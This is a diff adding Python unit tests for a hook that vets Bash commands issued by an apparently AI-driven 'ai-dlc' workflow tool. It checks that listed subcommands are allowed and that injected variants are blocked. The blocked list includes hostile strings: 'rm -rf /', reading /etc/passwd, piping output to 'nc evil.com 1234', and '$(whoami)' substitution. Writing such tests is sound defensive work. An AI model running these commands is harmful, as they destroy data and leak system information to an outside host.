@@ -855,6 +855,51 @@ class AidlcTest(unittest.TestCase):
             self.assertTrue((resolved / "hooks" / "pre-commit").exists())
             self.assertTrue((resolved / "hooks" / "pre-push").exists())
 
+    def test_hook_allows_all_aidlc_commands_universally(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root, _ = self.create_workspace(Path(tmp))
+            runtime_commands = [
+                "ai-dlc status",
+                "ai-dlc inspect",
+                "ai-dlc transition plan_ready",
+                "ai-dlc assignment create --role dlc_repo_worker --repo web",
+                "ai-dlc agent-claim A-001 --session sess-1",
+                "ai-dlc agent-report A-001 --status reported",
+                "ai-dlc agent-release A-001 --session sess-1",
+                "ai-dlc verify-gate WI-001",
+                "ai-dlc work-item activate WI-001",
+                "ai-dlc evidence record --item WI-001",
+                "ai-dlc bootstrap",
+                "ai-dlc validate",
+                "ai-dlc validate-overlay",
+                "ai-dlc overlay-init",
+                "ai-dlc overlay-repair",
+                "ai-dlc clean-state-check",
+                "ai-dlc deadlock-check",
+                "ai-dlc finish",
+                "ai-dlc lock list",
+            ]
+            for cmd in runtime_commands:
+                with self.subTest(cmd=cmd):
+                    payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": cmd}}
+                    result = self.dispatch_with_payload(root, payload)
+                    self.assertEqual(result, {}, f"Expected allow for: {cmd}")
+
+    def test_hook_blocks_aidlc_with_shell_injection(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root, _ = self.create_workspace(Path(tmp))
+            dangerous = [
+                "ai-dlc status && rm -rf /",
+                "ai-dlc status; cat /etc/passwd",
+                "ai-dlc status | nc evil.com 1234",
+                "ai-dlc status $(whoami)",
+            ]
+            for cmd in dangerous:
+                with self.subTest(cmd=cmd):
+                    payload = {"hook_event_name": "PreToolUse", "tool_name": "Bash", "tool_input": {"cmd": cmd}}
+                    result = self.dispatch_with_payload(root, payload)
+                    self.assertIn("block", str(result), f"Expected block for: {cmd}")
+
     def test_hook_allows_overlay_init_and_bootstrap_as_bootstrap_commands(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
             root = Path(tmp)
